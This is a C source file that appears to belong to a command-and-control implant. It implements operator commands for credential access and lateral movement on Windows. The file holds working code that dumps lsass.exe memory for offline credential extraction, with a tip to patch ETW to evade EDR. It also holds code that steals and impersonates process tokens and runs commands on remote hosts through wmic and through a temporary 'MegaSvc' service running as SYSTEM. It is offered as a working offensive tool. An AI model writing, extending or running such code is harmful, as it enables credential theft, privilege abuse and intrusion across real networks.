/*
 * client/handlers_lateral.c  –  Lateral movement and credential access handlers
 * ================================================================================
 * Implements the native C2 verb handlers for:
 *   dump_lsass              — MiniDumpWriteDump lsass → %TEMP%\lsass.dmp
 *   token_impersonate <pid> — steal and impersonate a process token
 *   lateral_wmi <host> <cmd>— remote exec via wmic Win32_Process.Create
 *   lateral_sc  <host> <cmd>— remote exec via sc create/start/delete (SYSTEM)
 *
 * All functions are declared in shell_internal.h and only called from
 * the dispatch loop in shell.c.
 */

#include "shell_internal.h"

#include <Windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── _handle_dump_lsass ─────────────────────────────────────────────────── */
/*
 * Opens lsass.exe with PROCESS_ALL_ACCESS (requires SeDebugPrivilege),
 * calls MiniDumpWriteDump via dynamically loaded dbghelp.dll, and saves
 * the output to %TEMP%\lsass.dmp.
 *
 * Retrieve the dump with:  download %TEMP%\lsass.dmp
 * Parse offline with:      pypykatz lsa minidump lsass.dmp
 *
 * Tip: run  etw_patch  first to reduce EDR telemetry.
 */
void _handle_dump_lsass(TLS_CONTEXT *pTls)
{
    /* Locate lsass.exe PID */
    DWORD lsassPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                char lower[MAX_PATH] = {0};
                for (size_t i = 0; pe.szExeFile[i] && i < MAX_PATH - 1; i++)
                    lower[i] = (char)(pe.szExeFile[i] | 0x20);
                if (strcmp(lower, "lsass.exe") == 0) {
                    lsassPid = pe.th32ProcessID; break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    if (!lsassPid) { _send_str(pTls, "[-] dump_lsass: lsass.exe not found"); return; }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
    if (!hProc) {
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] dump_lsass: OpenProcess failed (err %lu) — need SeDebugPrivilege",
            GetLastError());
        _send_str(pTls, buf); return;
    }

    char dumpPath[MAX_PATH] = {0};
    GetTempPathA(sizeof(dumpPath) - 10, dumpPath);
    strncat(dumpPath, "lsass.dmp", sizeof(dumpPath) - strlen(dumpPath) - 1);

    HANDLE hFile = CreateFileA(dumpPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProc);
        _send_str(pTls, "[-] dump_lsass: could not create dump file"); return;
    }

    typedef BOOL (WINAPI *MiniDump_t)(HANDLE, DWORD, HANDLE,
                                       MINIDUMP_TYPE,
                                       PMINIDUMP_EXCEPTION_INFORMATION,
                                       PMINIDUMP_USER_STREAM_INFORMATION,
                                       PMINIDUMP_CALLBACK_INFORMATION);

    HMODULE hDbg = LoadLibraryA("dbghelp.dll");
    MiniDump_t pDump = hDbg ?
        (MiniDump_t)GetProcAddress(hDbg, "MiniDumpWriteDump") : NULL;

    BOOL ok = FALSE;
    if (pDump)
        ok = pDump(hProc, lsassPid, hFile,
                   MiniDumpWithFullMemory, NULL, NULL, NULL);

    CloseHandle(hFile);
    CloseHandle(hProc);

    if (!ok) {
        DeleteFileA(dumpPath);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] dump_lsass: MiniDumpWriteDump failed (err %lu)", GetLastError());
        _send_str(pTls, buf); return;
    }

    char buf[MAX_PATH + 40];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] dump_lsass: saved to %s — pull with: download %s", dumpPath, dumpPath);
    _send_str(pTls, buf);
}


/* ── _handle_token_impersonate ───────────────────────────────────────────── */
/*
 * Opens the target process, duplicates its primary token as an impersonation
 * token, and calls ImpersonateLoggedOnUser.  All subsequent operations on
 * the current thread run under the borrowed identity.
 *
 * Requires SeImpersonatePrivilege (held by service accounts by default).
 */
void _handle_token_impersonate(TLS_CONTEXT *pTls, const char *args)
{
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (!pid) { _send_str(pTls, "Usage: token_impersonate <pid>"); return; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) {
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: OpenProcess(%lu) failed (err %lu)",
            pid, GetLastError());
        _send_str(pTls, buf); return;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: OpenProcessToken failed (err %lu)", GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hProc);

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hToken);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: DuplicateTokenEx failed (err %lu)", GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: ImpersonateLoggedOnUser failed (err %lu)",
            GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hDup);

    char user[256] = {0};
    DWORD cbUser = sizeof(user);
    GetUserNameA(user, &cbUser);

    char buf[320];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] token_impersonate: impersonating token from PID %lu — now running as: %s",
        pid, user);
    _send_str(pTls, buf);
}


/* ── _handle_lateral_wmi ────────────────────────────────────────────────── */
/*
 * Remote command execution via WMI Win32_Process.Create using wmic.exe
 * (LOLBin — avoids a COM/ole32.dll IAT dependency).
 *
 * Requires network access to \\host\IPC$ and valid credentials in the
 * current token (use token_impersonate first).
 */
void _handle_lateral_wmi(TLS_CONTEXT *pTls, const char *args)
{
    char host[256] = {0};
    char command[768] = {0};

    const char *p = args;
    size_t hi = 0;
    while (*p && *p != ' ' && hi < sizeof(host) - 1) host[hi++] = *p++;
    if (*p == ' ') p++;
    strncpy(command, p, sizeof(command) - 1);

    if (!host[0] || !command[0]) {
        _send_str(pTls, "Usage: lateral_wmi <host> <command>");
        return;
    }

    char shellcmd[1100] = {0};
    _snprintf(shellcmd, sizeof(shellcmd) - 1,
        "wmic /node:\"%s\" process call create \"cmd /c %s\" 2>&1",
        host, command);

    _shell_exec(pTls, shellcmd);
}


/* ── _handle_lateral_sc ─────────────────────────────────────────────────── */
/*
 * Remote command execution via sc.exe remote service creation.
 * Creates a one-shot service named "MegaSvc", starts it, then deletes it.
 * The command runs as SYSTEM on the target host.
 *
 * Requires ADMIN$ share access on the target.
 */
void _handle_lateral_sc(TLS_CONTEXT *pTls, const char *args)
{
    char host[256] = {0};
    char command[768] = {0};

    const char *p = args;
    size_t hi = 0;
    while (*p && *p != ' ' && hi < sizeof(host) - 1) host[hi++] = *p++;
    if (*p == ' ') p++;
    strncpy(command, p, sizeof(command) - 1);

    if (!host[0] || !command[0]) {
        _send_str(pTls, "Usage: lateral_sc <host> <command>");
        return;
    }

    char buf[1100] = {0};

    _snprintf(buf, sizeof(buf) - 1,
        "sc \\\\%s create MegaSvc binPath= \"cmd /c %s\" start= demand 2>&1",
        host, command);
    _shell_exec(pTls, buf);

    ZeroMemory(buf, sizeof(buf));
    _snprintf(buf, sizeof(buf) - 1, "sc \\\\%s start MegaSvc 2>&1", host);
    _shell_exec(pTls, buf);

    ZeroMemory(buf, sizeof(buf));
    _snprintf(buf, sizeof(buf) - 1, "sc \\\\%s delete MegaSvc 2>&1", host);
    _shell_exec(pTls, buf);
}
